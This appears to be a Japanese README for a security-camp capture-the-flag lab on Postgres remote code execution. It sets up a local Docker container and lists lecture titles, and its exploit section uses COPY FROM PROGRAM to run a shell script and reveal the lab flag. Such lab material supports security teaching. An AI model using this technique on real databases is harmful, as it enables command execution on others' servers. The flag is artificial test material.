# Postgres RCE

## 環境構築

```
$ docker build -t postgres .
$ docker run -d -p 127.0.0.1:5432:5432 postgres:latest
```

## 初期データ
空だとさびしいかなと思って最終日の講義情報いれた。

```
postgres=# \c seccamp
You are now connected to database "seccamp" as user "postgres".
seccamp=# select * from lectures;
                                                      name                                                       | track 
-----------------------------------------------------------------------------------------------------------------+-------
 マクロな視点から捉える Web セキュリティ: Web インフラストラクチャを利用した攻撃とサイドチャネル攻撃の実践と評価 | B
 Learn the essential way of thinking about vulnerabilities through post-exploitation on middlewares              | B
 最先端のオフェンシブセキュリティ研究入門                                                                        | C
 機械学習モデルの構築と攻撃 (Part 3)                                                                             | D
 セキュリティ啓発マンガの制作                                                                                    | D
 ワークショップで学ぶ偽装通信対策                                                                                | A
 ロバストプロコル・オープンチャレンジ大会                                                                        | A
(7 rows)
```

## Exploit

```
$ psql -U postgres -h localhost
psql (10.14, server 12.4 (Debian 12.4-1.pgdg100+1))
WARNING: psql major version 10, server major version 12.
         Some psql features might not work.
Type "help" for help.

postgres=# CREATE TABLE cmd_exec(cmd_output text);
CREATE TABLE
postgres=# COPY cmd_exec FROM PROGRAM '/usr/local/bin/run_it.sh';
COPY 1
postgres=# SELECT * FROM cmd_exec;
               cmd_output               
----------------------------------------
 flag{Y0u_ar3_m4ster_0f_p0stgr3}
(1 row)

postgres=# 

```
